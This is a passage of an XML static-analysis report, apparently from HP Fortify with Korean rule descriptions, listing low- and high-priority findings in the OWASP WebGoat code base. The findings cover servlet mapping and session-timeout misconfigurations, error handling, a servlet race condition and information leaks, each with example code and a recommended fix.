<Value>여러 URL 패턴이 단일 서블릿에 매핑되는 것은 아키텍처가 올바르지 않거나 표준화가 없음을 나타내는 경우가 많습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>단일 서블릿에 여러 URL 패턴이 매핑되는 것은 서블릿이 너무 많은 기능을 수행한다는 신호일 수 있습니다.



예제 1: 다음 예제는 5개의 URL 패턴을 단일 서블릿에 매핑합니다.

&lt;servlet&gt;
    &lt;servlet-class&gt;com.class.MyServlet&lt;/servlet-class&gt;
    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
&lt;/servlet&gt;

&lt;servlet-mapping&gt;
    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/myservlet&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;servlet-mapping&gt;
    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/helloworld*&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;servlet-mapping&gt;
    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/servlet*&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;servlet-mapping&gt;
    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/mservlet*&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;

&lt;servlet-mapping&gt;
    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;
&#13;
이 카테고리는 Cigital Java Rulepack에서 비롯되었습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>여러 기능을 수행하는 서블릿의 기능을 각각 고유한 URL 매핑과 단일 기능을 가진 별도의 서블릿으로 분할하십시오. 이렇게 하면 해당 기능에 대한 진입 경로의 수가 줄어들므로 권한이 있는 작업이나 민감한 작업을 수행하는 서블릿에서 특히 중요합니다.

예제 2: 다음 예는 URL 패턴 하나를 단일 Servlet에 매핑합니다.

&lt;servlet&gt;
    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;com.class.MyServlet&lt;/servlet-class&gt;
    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
&lt;/servlet&gt;

&lt;servlet-mapping&gt;
    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/myservlet&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. HP Fortify Static Code Analyzer는 Servlet 하나에 세 개 이상의 서블릿 매핑이 있을 때 문제를 보고합니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="E11F263227031B7EBEBEBA1EA7476158" ruleID="0D9BE329-46FC-420F-A0A1-0B556629300D">
                            <Category>J2EE Misconfiguration: Excessive Servlet Mappings</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>여러 URL 패턴이 단일 서블릿에 매핑되는 것은 아키텍처가 올바르지 않거나 표준화가 없음을 나타내는 경우가 많습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>web.xml</FileName>
<FilePath>WebContent/WEB-INF/web.xml</FilePath>
<LineStart>200</LineStart>
<Snippet>

    &lt;servlet-mapping&gt;
      &lt;servlet-name&gt;AxisServlet&lt;/servlet-name&gt;
      &lt;url-pattern&gt;/servlet/AxisServlet&lt;/url-pattern&gt;</Snippet>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>J2EE Misconfiguration: Excessive Session Timeout</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>지나치게 긴 세션 시간 초과는 공격자에게 사용자 계정을 잠재적으로 손상시킬 수 있는 시간을 더 많이 제공합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>세션을 더 오래 열어둘수록, 공격자가 사용자 계정을 손상시킬 수 있는 기회는 더 커집니다. 세션이 활성화 상태라면 공격자는 사용자의 암호를 무차별 대입하거나 사용자의 무선 암호화 키를 불법으로 복제하거나 열려 있는 브라우저에서 세션을 제멋대로 쓸 수도 있습니다. 또한 세션 초과 시간이 더 길어지면 메모리가 해제되지 못하도록 하여 결국 충분히 많은 세션이 만들어지는 경우 Denial of Service가 발생됩니다.

예제 1: 세션 시간 초과가 0 또는 0 미만일 경우, 세션은 만료되지 않습니다. 다음 예는 -1로 설정된 세션 시간 초과를 보여주며 이로 인해 세션은 무기한으로 활성화 상태가 됩니다.

&lt;session-config&gt;
    &lt;session-timeout&gt;-1&lt;/session-timeout&gt;
&lt;/session-config&gt;


&lt;session-timeout&gt; 태그는 웹 응용 프로그램의 모든 세션에 대해 기본 세션 시간 초과 간격을 정의합니다. &lt;session-timeout&gt; 태그가 누락된 경우, 기본 시간 초과를 설정하도록 컨테이너에 맡겨집니다.&#13;
이 카테고리는 Cigital Java Rulepack에서 비롯되었습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>세션 시간 초과를 30분 이하로 설정하십시오. 그러면 사용자가 일정 기간 동안 응용 프로그램과 상호 작용할 수 있을 뿐 아니라 공격 기간에 대한 합리적인 경계가 제공됩니다.

예제 2: 다음 예제는 세션 시간 초과를 20분으로 설정합니다.

&lt;session-config&gt;
  &lt;session-timeout&gt;20&lt;/session-timeout&gt;
&lt;/session-config&gt;
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="C2F39B963AB1AFACD8D57325EEAF747F" ruleID="B7ED276F-524D-444B-8930-7D77535BF0D0">
                            <Category>J2EE Misconfiguration: Excessive Session Timeout</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>지나치게 긴 세션 시간 초과는 공격자에게 사용자 계정을 잠재적으로 손상시킬 수 있는 시간을 더 많이 제공합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>web.xml</FileName>
<FilePath>WebContent/WEB-INF/web.xml</FilePath>
<LineStart>248</LineStart>
<Snippet>         HttpSession.getMaxInactiveInterval(). --&gt;

    &lt;session-config&gt;
    	&lt;!-- 2 days --&gt;
        &lt;session-timeout&gt;2880&lt;/session-timeout&gt;</Snippet>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>J2EE Misconfiguration: Missing Servlet Mapping</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>web.xml에 정의된 서블릿은 해당하는 서블릿 매핑 없이 액세스할 수 없습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>유효한 서블릿 매핑이 없으면 매핑되지 않은 서블릿에 대한 모든 액세스가 차단됩니다.



예제 1: web.xml의 다음 항목은 ExampleServlet을 정의하지만 해당하는 서블릿 매핑을 정의하지 않습니다.

&lt;web-app
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
    version="2.4"&gt;

    &lt;servlet&gt;
      &lt;servlet-name&gt;ExampleServlet&lt;/servlet-name&gt;
      &lt;servlet-class&gt;com.class.ExampleServlet&lt;/servlet-class&gt;
      &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
    &lt;/servlet&gt;

&lt;/web-app&gt;
&#13;
이 카테고리는 Cigital Java Rulepack에서 비롯되었습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>모든 &lt;servlet&gt;에 해당하는 &lt;servlet-mapping&gt;이 있는지 확인하십시오.

예제 2: web.xml의 다음 항목은 ExampleServlet과 해당하는 서블릿 매핑을 정의합니다.

&lt;web-app
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
    version="2.4"&gt;
    &lt;servlet&gt;
        &lt;servlet-name&gt;ExampleServlet&lt;/servlet-name&gt;
        &lt;servlet-class&gt;com.class.ExampleServlet&lt;/servlet-class&gt;
        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
    &lt;/servlet&gt;
    &lt;servlet-mapping&gt;
        &lt;servlet-name&gt;ExampleServlet&lt;/servlet-name&gt;
        &lt;url-pattern&gt;/exampleservlet&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;

    &lt;servlet-mapping&gt;
        &lt;servlet-name&gt;action&lt;/servlet-name&gt;
        &lt;url-pattern&gt;/action&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;
&lt;/web-app&gt;
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="5E91D4245219FB0BEA8CCB65B50465D4" ruleID="8BA3B029-5DB0-434D-B202-D31FF2B64665">
                            <Category>J2EE Misconfiguration: Missing Servlet Mapping</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>web.xml에 정의된 서블릿은 해당하는 서블릿 매핑 없이 액세스할 수 없습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>web.xml</FileName>
<FilePath>WebContent/WEB-INF/web.xml</FilePath>
<LineStart>79</LineStart>
<Snippet>    &lt;/servlet&gt;
 
    &lt;servlet&gt;
      &lt;servlet-name&gt;AdminServlet&lt;/servlet-name&gt;
      &lt;display-name&gt;Axis Admin Servlet&lt;/display-name&gt;</Snippet>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Poor Error Handling: Throw Inside Finally</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>finally 블록 내에서 throw 문을 사용하면 try-catch-finally를 통한 논리 진행이 깨집니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Java에서 finally 블록은 항상 해당 try-catch 블록 뒤에서 실행되며 대개 파일 핸들 또는 데이터베이스 커서와 같이 할당된 리소스를 해제하는 데 사용됩니다. finally 블록에서 예외를 발생시키면 정상적인 프로그램 실행이 손상되므로 중요한 정리 코드를 무시할 수 있습니다. 

예제 1: 다음 코드에서 stmt.close()에 대한 호출은 FileNotFoundException이 발생할 때 무시됩니다.

public void processTransaction(Connection conn) throws FileNotFoundException
{
    FileInputStream fis = null;
    Statement stmt = null;
    try
    {
        stmt = conn.createStatement();
        fis = new FileInputStream("badFile.txt");
        ...
    }
    catch (FileNotFoundException fe)
    {
        log("File not found.");
    }
    catch (SQLException se)
    {
        //handle error
    }
    finally
    {
        if (fis == null)
        {
            throw new FileNotFoundException();
        }

        if (stmt != null)
        {
            try
            {
                stmt.close();
            }
            catch (SQLException e)
            {
                log(e);
            }
        }
    }
}
&#13;
이 카테고리는 Cigital Java Rulepack에서 비롯되었습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>finally 블록 내에서 예외 사항을 발생시키지 마십시오. 예외 사항을 다시 발생시켜야 할 경우, finally 블록의 정상적인 실행을 방해하지 않도록 catch 블록 내에서 하십시오.
예제 2: 다음 코드는 FileNotFoundException을 catch 블록에서 다시 발생시킵니다.

public void processTransaction(Connection conn) throws FileNotFoundException
{
    FileInputStream fis = null;
    Statement stmt = null;
    try
    {
        stmt = conn.createStatement();
        fis = new FileInputStream("badFile.txt");
        ...
    }
    catch (FileNotFoundException fe)
    {
        log("File not found.");
        throw fe;
    }
    catch (SQLException se)
    {
        //handle error
    }
    finally
    {
        if (fis != null)
        {
            try
            {
                fis.close();
            }
            catch (IOException ie)
            {
                log(ie);
            }
        }

        if (stmt != null)
        {
            try
            {
                stmt.close();
            }
            catch (SQLException e)
            {
                log(e);
            }
        }
    }
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="2187F16130F337E4EEE7987EBDEF1FA1" ruleID="1F50410E-C148-415D-94A1-38D911C45919">
                            <Category>Poor Error Handling: Throw Inside Finally</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>finally 블록 내에서 throw 문을 사용하면 try-catch-finally를 통한 논리 진행이 깨집니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Interceptor.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Interceptor.java</FilePath>
<LineStart>118</LineStart>
<Snippet>	}
	finally
	{
	    if (out != null)
	    {</Snippet>
<TargetFunction>FinallyBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Poor Style: Confusing Naming</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>UserTracker 클래스에 둘 다 이름이 instance인 필드와 메서드가 있어서 혼동됩니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>멤버 필드와 메서드가 이름이 같으면 혼동하기 쉽습니다. 프로그래머가 필드에 접근해야 할 때 실수로 메서드를 호출하거나 그 반대가 발생할 수 있습니다.

예제 1:


public class Totaller {
  private int total;
  public int total() {
    ...
  }
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>메서드나 필드 중 하나의 이름을 바꾸십시오. 메서드가 필드를 반환하는 경우 다음 표준 getter/setter 명명 규칙을 고려해 보십시오.

예제 2: Example 1의 코드는 다음과 같이 다시 작성할 수 있습니다.


public class Totaller {
  private int total;
  public int getTotal() {
    ...
  }
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="54F30CBCD507B01E1FA9ABBBCFE3B1AD" ruleID="FE7263A8-4A1C-4048-9F53-5B892AC7533A">
                            <Category>Poor Style: Confusing Naming</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>UserTracker 클래스에 둘 다 이름이 instance인 필드와 메서드가 있어서 혼동됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UserTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/UserTracker.java</FilePath>
<LineStart>49</LineStart>
<Snippet>{

    private static UserTracker instance;

    // FIXME: persist this somehow!</Snippet>
<TargetFunction>Field: instance()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>Race Condition: Singleton Member Field</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>HammerHead 클래스는 하나뿐이기 때문에 mySession 멤버 필드는 사용자 간에 공유됩니다. 결과는 하나의 사용자가 다른 사용자의 데이터를 볼 수 있는 것입니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>많은 Servlet 개발자들은 Servlet이 단일 항목이라는 사실을 모릅니다. Servlet의 인스턴스는 하나뿐이며, 이 단일 인스턴스를 여러 번 사용하여 다른 스레드에 의해서 동시에 처리되는 여러 요청을 처리합니다. 

이런 무지로 인해 일반적으로 발생하는 결과는 개발자가 사용자로 하여금 실수로 다른 사용자의 데이터를 볼 수 있도록 Servlet 멤버 필드를 사용하는 것입니다. 다시 말해, 사용자 데이터를 Servlet 멤버 필드에 저장하여 데이터 접근 경쟁 조건(race condition)을 야기합니다.

예제 1: 다음 Servlet은 요청 매개 변수의 값을 멤버 필드에 저장한 다음, 나중에 매개 변수 값을 응답 출력 스트림으로 보냅니다.


public class GuestBook extends HttpServlet {

   String name;

   protected void doPost (HttpServletRequest req, HttpServletResponse res) {
     name = req.getParameter("name");
     ...
     out.println(name + ", thanks for visiting!");
   }
}


이 코드는 단일 사용자 환경에서는 올바로 동작하지만, 두 명의 사용자가 거의 동시에 Servlet에 접근하면 다음과 같이 두 요청 처리기 스레드가 얽힐 수 있습니다.

스레드 1:	name에 "Dick" 할당
스레드 2:	name에 "Jane" 할당
스레드 1:	print "Jane, thanks for visiting!"
스레드 2:	print "Jane, thanks for visiting!"

따라서 첫 번째 사용자에게 두 번째 사용자의 이름이 표시됩니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Servlet 멤버 필드를 상수 저장 외에 다른 용도로 사용하지 마십시오. 즉, 모든 멤버 필드를 static final로 지정하십시오.

개발자가 데이터를 코드의 한 장소에서 다른 장소로 옮겨야 할 때 사용자 데이터에 Servlet 멤버 필드를 사용하고 싶을 것입니다. 그래야 할 경우, 별도의 클래스를 선언하고 Servlet은 새 클래스를 "래핑"하는 데만 사용하도록 하십시오. 

예제 2: Example 1의 버그는 다음과 같이 수정할 수 있습니다.


public class GuestBook extends HttpServlet {

   protected void doPost (HttpServletRequest req, HttpServletResponse res) {
	GBRequestHandler handler = new GBRequestHandler();
	handler.handle(req, res);
   }
}

public class GBRequestHandler {

   String name;

   public void handle(HttpServletRequest req, HttpServletResponse res) {
     name = req.getParameter("name");
     ...
     out.println(name + ", thanks for visiting!");
   }

}


또는 Servlet이 동기화된 차단을 사용하여 서블릿 인스턴스 변수에 접근할 수 있지만 동기화된 차단을 사용하면 중요한 성능 문제가 발생할 수 있습니다.

동기화된 블록 내에서 필드 접근을 래핑하는 경우 같은 동기화 블록 또는 메서드 내에서 해당 멤버에 대한 모든 읽기 및 쓰기 작업을 수행해야 문제를 방지할 수 있습니다.

예제 3: Example 1 쓰기 작업(할당)을 동기화된 블록에서 래핑해도 문제는 해결되지 않습니다. 스레드가 name 필드 수정을 위한 잠금을 획득하기는 하지만 이후 잠금을 해제하므로 두 번째 스레드가 값을 다시 변경할 수 있기 때문입니다. name 값을 변경한 후 첫 번째 스레드가 실행을 다시 시작하면 두 번째 스레드가 할당한 값이 인쇄됩니다.


public class GuestBook extends HttpServlet {

   String name;

   protected void doPost (HttpServletRequest req, HttpServletResponse res) {
     synchronized(name) {
        name = req.getParameter("name");
     }
     ...
     out.println(name + ", thanks for visiting!");
   }
}


이러한 race condition을 해결하려면 공유 멤버 필드에 대한 모든 쓰기 및 읽기 작업을 동일한 동기화된 블록 내에서 최소 단위로 실행해야 합니다.


public class GuestBook extends HttpServlet {

   String name;

   protected void doPost (HttpServletRequest req, HttpServletResponse res) {
     synchronized(name) {
        name = req.getParameter("name");
        ...
        out.println(name + ", thanks for visiting!");
     }
   }
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>1</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="BCB5C4E0BB20E60245EFFF8B8B0D6EF7" ruleID="9818E2BB-8E28-4CBE-88CD-DE8DF5EFF040">
                            <Category>Race Condition: Singleton Member Field</Category>
                            <Folder>High</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>HammerHead 클래스는 하나뿐이기 때문에 mySession 멤버 필드는 사용자 간에 공유됩니다. 결과는 하나의 사용자가 다른 사용자의 데이터를 볼 수 있는 것입니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>135</LineStart>
<Snippet>	    // FIXME: If a response is written by updateSession(), do not
	    // call makeScreen() and writeScreen()
	    mySession = updateSession(request, response, context);
	    if (response.isCommitted())
		return;</Snippet>
<TargetFunction>AssignmentStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="1">
                        <groupTitle>System Information Leak: External</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>main.jsp의 _jspService() 함수는 200 줄의 print()을(를) 호출하여 시스템 데이터 또는 디버그 정보를 노출합니다. print()에 의해 노출된 정보는 공격자가 공격을 계획하는 데 도움을 줄 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>외부 정보는 시스템 데이터 또는 디버그 정보가 소켓이나 네트워크 연결을 통해 프로그램에서 원격 시스템으로 이동할 때 누출됩니다. 외부 누출 시 운영 체제, 전체 경로 이름, 사용자 이름의 유무 또는 구성 파일 위치에 대한 특정 데이터가 노출되어 공격자가 보다 쉽게 공격할 수 있습니다. 또한 공격자가 접근하기 더 어려운 내부 정보가 누출되는 것보다 이 문제가 더 심각합니다.



예제 1: 다음 코드는 HTTP 응답에서 예외 정보를 누출합니다.


protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {
    ...
    PrintWriter out = res.getWriter();
    try {
        ...
    } catch (Exception e) {
      out.println(e.getMessage());
    }
}


이 정보는 원격 사용자에게 노출될 수 있습니다. 경우에 따라 오류 메시지가 공격자에게 시스템이 취약한 정확한 공격 유형을 알려주기도 합니다. 예를 들어, 데이터베이스 오류 메시지가 응용 프로그램이 SQL injection 공격에 취약하다는 것을 드러낼 수 있습니다. 다른 오류 메시지도 비교적 모호하지만 시스템에 대한 단서를 제공합니다. Example 1에서는 누출된 정보가 운영 체제의 종류, 시스템에 설치된 응용 프로그램 및 관리자가 프로그램 구성에 들인 관심의 정도에 대한 정보를 암시할 수 있습니다.

정보 유출은 모바일 컴퓨팅 환경에서도 문제가 됩니다. 모바일 플랫폼에서는 다양한 소스에서 다운로드된 응용 프로그램이 같은 장치에서 함께 실행됩니다. 즉 금융 응용 프로그램과 맬웨어를 함께 실행할 가능성이 높으므로 응용 프로그램 작성자는 장치에서 실행되는 다른 응용 프로그램으로 주소가 지정된 메시지에 포함하는 정보를 주의하여 선택해야 합니다.

예제 2: 다음 코드는 등록된 모든 Android 수신자에 대해 catch된 예외의 스택 추적을 브로드캐스트합니다.

...
try {
  ...
} catch (Exception e) {
    String exception = Log.getStackTraceString(e);
    Intent i = new Intent();
    i.setAction("SEND_EXCEPTION");
    i.putExtra("exception", exception);
    view.getContext().sendBroadcast(i);
}
...


모바일 환경과 관련된 시나리오가 하나 더 있습니다. 현재 대부분의 모바일 장치는 무선 통신을 사용하는 장치 간에 정보를 빠르게 교환할 수 있도록 NFC(근거리 통신) 프로토콜을 구현합니다. NFC 프로토콜은 장치를 근접하게 또는 서로 접촉하도록 배치하는 방식으로 작동합니다. NFC의 통신 범위는 불과 몇 센티미터 정도로 제한되지만 NFC만 사용해서는 보안 통신이 보장되지 않으므로 도청, 데이터 수정 및 기타 다양한 유형의 공격을 할 수 있습니다.

예제 3: Android 플랫폼에서는 NFC가 지원됩니다. 다음 코드는 범위 내의 다른 장치로 푸시되는 메시지를 생성합니다.

...
public static final String TAG = "NfcActivity";
private static final String DATA_SPLITTER = "__:DATA:__";
private static final String MIME_TYPE = "application/my.applications.mimetype";
...
TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE);
String VERSION = tm.getDeviceSoftwareVersion();
...
NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this);
if (nfcAdapter == null)
  return;

String text = TAG + DATA_SPLITTER + VERSION;
NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA,
            MIME_TYPE.getBytes(), new byte[0], text.getBytes());
NdefRecord[] records = { record };
NdefMessage msg = new NdefMessage(records);
nfcAdapter.setNdefPushMessage(msg, this);
...


NDEF(NFC 데이터 교환 형식) 메시지에는 형식화된 데이터, URI 또는 사용자 지정 응용 프로그램 페이로드가 포함됩니다. 메시지에 응용 프로그램 이름, MIME 유형 또는 장치 소프트웨어 버전 같은 응용 프로그램 관련 정보가 포함되어 있으면 도청자에게 해당 정보가 노출될 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>오류 메시지를 쓸 때는 항상 보안을 염두에 두어야 합니다. 운영 환경에서는 자세한 오류 정보 대신 간단한 메시지를 사용합니다. 관리자와 프로그래머가 문제를 진단하는 데 도움이 되는 상세한 출력의 생성 및 저장은 삼가는 것이 좋습니다. 디버깅 추적은 때에 따라 엉뚱한 곳에 나타날 수 있습니다(예: 오류 페이지의 HTML에서 주석에 포함됨).

스택 추적이나 데이터베이스 덤프를 나타내지 않는 간결한 오류 메시지도 공격자에게 도움을 줍니다. 예를 들어, "액세스 거부" 메시지는 시스템에 파일이나 사용자가 존재한다는 것을 나타냅니다. 그러므로 프로그램 외부 리소스로 절대 정보를 보내지 마십시오.
